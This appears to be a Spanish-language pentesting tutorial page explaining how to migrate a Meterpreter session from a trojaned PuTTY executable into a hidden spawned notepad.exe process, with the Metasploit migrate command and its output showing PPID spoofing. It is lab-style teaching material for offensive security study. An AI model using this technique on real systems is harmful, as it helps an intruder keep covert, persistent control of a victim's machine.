# Migración de meterpreter a otro proceso

Siguiendo la practica anterior, cuando el usuario cierra el programa se nos va la sesion, pero para que no pase esto podremos migrar a otro proceso para que cuando dicho usuario cierre el programa a nosotros no nos afecte y podamos seguir teniendo la shell.

Si nosotros dentro de la sesion de `meterpreter` ponemos el siguiente comando:

```shell
run post/windows/manage/migrate
```

Info:

```
[*] Running module against DESKTOP-EALA4JN
[*] Current server process: puttyX.exe (7156)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1296
[+] Successfully migrated into process 1296
```

Lo que esta haciendo es que esta creando un nuevo proceso oculto, en este caso llamado `notepad.exe` y migra este `meterpreter` a dicho proceso, por lo que cuando se cierre el programa no le va a pasar nada a la conexion.

Este sera el proceso donde esta la shell:

<figure><img src="../../.gitbook/assets/image (138) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que si se cierra ese, se nos va la conexion.
